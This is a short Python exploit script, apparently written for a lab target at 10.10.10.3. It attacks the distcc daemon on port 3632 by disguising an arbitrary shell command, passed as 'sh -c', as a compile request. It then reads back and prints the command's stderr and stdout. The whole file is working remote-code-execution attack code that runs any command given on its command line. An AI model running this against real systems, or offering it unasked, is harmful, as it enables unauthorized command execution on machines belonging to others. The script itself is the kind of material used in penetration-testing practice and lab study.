#!/usr/bin/env python3

import socket
import sys
import shlex
import struct
import base64

TARGET = "10.10.10.3"
PORT = 3632

def dist_cmd(*args):
    args = list(args)
    # Convince distccd that this is a compile
    args += ["#", "-c", "main.c", "-o", "main.o"]
    # Set distcc 'magic fairy dust' and argument count
    res = f"DIST00000001ARGC{len(args):8x}"
    # Set the command arguments
    for arg in args:
        res += f"ARGV{len(arg):8x}{arg}"
    return res



cmd = sys.argv[1]
distcmd=dist_cmd("sh", "-c", cmd)
dtag = "DOTI0000000A#abcdefghij\n"

s = socket.create_connection((TARGET, PORT))
s.settimeout(5)
s.sendall(distcmd.encode())
s.sendall(dtag.encode())
res = s.recv(24)
print(res)
if not (res and len(res) == 24):
    print("Didn't reply")
    s.close()
    exit(1)

# check stderr
res = s.recv(4)
print(res)
res = s.recv(8)
print(res)
res = base64.b16decode(res.upper())
length = struct.unpack("I", res)[0]

if length > 0:
    res = s.recv(length)
    for line in res.decode().split("\n"):
        print(f"stderr: {line}")
    

# check stdout
res = s.recv(4)
print(res)
res = s.recv(8)
print(res)
res = base64.b16decode(res.upper())
length = struct.unpack("I", res)[0]

if not length:
    print("error parsing length")
    exit(1)

if length > 0:
    res = s.recv(length)
    for line in res.decode().split("\n"):
        print(f"stdout: {line}")

s.close()

